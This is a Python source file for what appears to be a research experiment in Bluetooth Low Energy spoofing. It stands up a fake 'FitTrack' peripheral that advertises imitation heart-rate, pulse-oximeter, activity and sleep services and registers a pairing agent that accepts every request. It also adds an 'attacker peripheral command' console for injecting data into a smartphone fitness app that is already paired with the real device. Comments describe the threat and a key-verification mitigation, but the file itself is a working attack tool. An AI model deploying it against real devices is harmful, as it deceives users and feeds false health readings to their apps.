import asyncio
from asyncio import Queue, Event, create_task
from bluez_peripheral.util import Adapter, get_message_bus, is_bluez_available
from bluez_peripheral.advert import Advertisement
from bluez_peripheral.gatt.service import ServiceCollection
from bluez_peripheral.gatt.characteristic import CharacteristicFlags as CF
from bluez_peripheral.agent import NoIoAgent
from bluez_peripheral.advert import AdvertisingIncludes
from services.fake_heart_rate_service import HEARTRATE_SERVICE, FakeHeartRateService
from services.fake_pulse_oximeter_service import PULSEOXIMETER_SERVICE, FakePulseOximeterService
from services.fake_physical_activity_monitor_service import PHYSICAL_ACTIVITY_SERVICE, FakePhysicalActivityMonitorService
from services.fake_sleep_monitor_service import SLEEP_MONITOR_SERVICE, FakeSleepMonitorService
from utils.adapter_utils import set_adapter_alias, set_adapter_discoverable, set_adapter_powered, find_adapter_props
from utils.btmgmt_utils import setup_btmgmt
import os
import logging

DEVICE_NAME = "FitTrack"
RED = "\033[91m"
RESET = "\033[0m"
YELLOW = "\033[93m"

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)


async def queue_control_consumer(service: FakePhysicalActivityMonitorService | FakeSleepMonitorService, queue: Queue, stop_event: Event):
    """Consume text commands from queue and feed them to service handlers logic"""

    while not stop_event.is_set():
        try:
            line = await asyncio.wait_for(queue.get(), timeout=0.5)
        except asyncio.TimeoutError:
            continue

        if line is None:
            # mark the sentinel as done and exit
            try:
                queue.task_done()
            except Exception:
                pass
            break

        # service exposes handle_command
        try:
            if hasattr(service, "handle_command"):
                maybe = service.handle_command(line)

                if asyncio.iscoroutine(maybe):
                    await maybe
            else:
                print("No handle_command implemented on service: ", line)

        except Exception as e:
            print("Unknown command: ", e)

            if stop_event.is_set():
                break
        finally:
            # tell queue that item has been processed
            try:
                queue.task_done()
            except Exception:
                pass


async def stdin_reader_and_dispatch(pams_queue: Queue, sams_queue: Queue, stop_event: Event):
    """Single Couroutine that reads stdin and dispatches lines to service queues
    Commands:
        pams <command>
        sams <command>
        exit
        help
    """

    loop = asyncio.get_event_loop()
    print("Type 'help' for commands. Prefix commands with 'pams' or 'sams'.")

    while not stop_event.is_set():
        try:
            # Attacker Peripheral Command (APCMD)
            line = await loop.run_in_executor(None, input, f"{RED}[APCMD]{RESET} ")
        except (EOFError, KeyboardInterrupt):
            print("Exiting...")
            stop_event.set()
            break

        if line is None:
            continue

        line = line.strip()

        if not line:
            continue

        parts = line.split()

        if not parts:
            continue

        head = parts[0].lower()

        rest = " ".join(parts[1:])

        if head in ("help", "?"):
            print("Attacker Peripheral Commands:")
            print(
                "  pams <...>       send command to Physical Activity Monitor Service")
            print(
                "  sams <...>       send command to Sleep Activity Monitor Service")
            print("  exit")
            print("  help")
            continue

        if head == "exit":
            # we need to notify others to clean up and stop
            print(f"{YELLOW}APCMD exiting...")
            print(f"{YELLOW}Stopping services...")
            print(f"{RED}Stopped APCMD")

            stop_event.set()

            # push sentinel to queues so consumer loops can unblock
            await sams_queue.put(None)
            await pams_queue.put(None)
            break

        if head == "pams":
            await pams_queue.put(rest)
            # wait until consumer processed the item
            try:
                await pams_queue.join()
            except asyncio.CancelledError:
                break
            continue
        if head == "sams":
            await sams_queue.put(rest)
            try:
                await pams_queue.join()
            except asyncio.CancelledError:
                break

        print("Unknown target. Prefix commands with 'pams' or 'sams'. Type 'help'.")


async def main():
    # for this attack the client (app smartphone device) will already be paired with the real ble peripheral
    # we advertise the fake ble peripheral with characterstics in plaintext and the app should accept this
    # because the app will be scanning for names the attack goes through
    # by inspecting the app the attacker can narrow the services/characteristics down and advertise their own fake service/char in plaintext

    # the mitigation for this attack would be the storing of the ltk keys in an async storage of the app so
    # once paired devices should be verified by the token otherwise our app would sucribe to every gatt services of our attackers
    # attacker runs a bluetoothctl scan sees mac and name --> exposed
    # attacker fakes a peripheral a

    # but how can the attacker know the real format of our payloads between the real peripheral and app device
    # either by public spec (anyone can read them
    # or by app reverse engineering, can inspect the apk/ipa and find which uuids and the parsers the app uses
    # or brute force the payload formats, by trying various combinations of byte payloads
    # for this experiment we assume the attacker knows all of the payloads, as this is not the scope of the attack

    bus = await get_message_bus()

    if await is_bluez_available(bus):
        print("BlueZ available on system bus")
    else:
        print("BlueZ not available on system bus")
        return

    # finds the path for hci1, because we will run the attacker peripheral on a bluetooth toggle
    adapter_path, _ = await find_adapter_props(bus)
    await set_adapter_powered(bus)
    await set_adapter_discoverable(bus)

    # map adapter path
    adapters = await Adapter.get_all(bus)
    adapter_obj = None
    for a in adapters:
        obj_path = a._proxy.path
        path_attr = a._proxy.path
        logger.debug("Proxy Bus: %s", a._proxy.bus)
        logger.debug("Proxy Bus name: %s", a._proxy.bus_name)
        logger.debug("Proxy Bus path: %s", a._proxy.path)

        logger.debug(
            "Inspecting adapter object: proxy.object_path=%s, path=%s", obj_path, path_attr)

        try:
            if obj_path is not None and obj_path == adapter_path:
                adapter_obj = a
                logger.info("Found adapter by proxy.object_path: %s", obj_path)
                break

        except Exception:
            logger.warning("Exception while inspecting adapter: %s", e)
            continue

    if adapter_obj is None:
        # fallback: try find by suffix 'hci1'
        for a in adapters:
            try:
                if getattr(a.proxy, "object_path", "").endswith("/hci1"):
                    adapter_obj = a
                    logger.info("Found adapter by suffix match: %s", obj_path)
                    break
            except Exception:
                continue

    if setup_btmgmt() == False:
        return

    # NoIoAgent will accept all incoming pairing requests from all devices unconditionally, so
    # o if we paired the real device and the fake peripheral presents itself with the MAC address or device name of the real BLE peripheral,
    # the system will automatically trust and connect to the fake device without prompting the user
    agent = NoIoAgent()

    try:
        # register should be set on default in order to accept pairing requests
        await agent.register(bus, default=True)
    except Exception as e:
        print(f"Failed to register agent: {e}")

    # create the services
    fake_heartrate_service = FakeHeartRateService()
    fake_pulse_oximeter_service = FakePulseOximeterService()
    fake_physical_activity_service = FakePhysicalActivityMonitorService()
    fake_sleep_monitor_service = FakeSleepMonitorService()

    try:
        services = ServiceCollection()
        services.add_service(fake_heartrate_service)
        services.add_service(fake_pulse_oximeter_service)
        services.add_service(fake_physical_activity_service)
        services.add_service(fake_sleep_monitor_service)
        await services.register(bus, adapter=adapter_obj)
    except Exception as e:
        print(f"Failed to register serivce: {e}")

    await set_adapter_alias(bus, DEVICE_NAME)

    advert = Advertisement(
        localName=DEVICE_NAME,
        serviceUUIDs=[HEARTRATE_SERVICE,
                      PULSEOXIMETER_SERVICE,
                      PHYSICAL_ACTIVITY_SERVICE,
                      SLEEP_MONITOR_SERVICE],
        appearance=0,
        timeout=0,
        discoverable=True,
        includes=AdvertisingIncludes.TX_POWER,
        duration=65535
    )

    try:
        await advert.register(bus, adapter=adapter_obj)
        print("-------------------Advertisment registered-----------------------")
    except Exception as e:
        print(f"Failed to register advertisement: {e}")

    # create queues & stop event
    pams_queue = Queue()  # Physical Activity Monitor Service
    sams_queue = Queue()  # Sleep Activity Monitor Service
    stop_event = Event()

    tasks = [
        asyncio.create_task(fake_heartrate_service.start()),
        asyncio.create_task(queue_control_consumer(
            fake_physical_activity_service, pams_queue, stop_event)),
        asyncio.create_task(queue_control_consumer(
            fake_sleep_monitor_service, sams_queue, stop_event)),
        asyncio.create_task(stdin_reader_and_dispatch(
            pams_queue, sams_queue, stop_event))
    ]

    try:
        wait_task = [asyncio.create_task(
            bus.wait_for_disconnect()), asyncio.create_task(stop_event.wait())]

        # clean shutdown, we wait until BlueZ disconnects or stop_event is set
        done, pending = await asyncio.wait(wait_task, return_when=asyncio.FIRST_COMPLETED)

        for t in pending:
            t.cancel()
    finally:
        stop_event.set()

        for t in tasks:
            t.cancel()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Exiting")
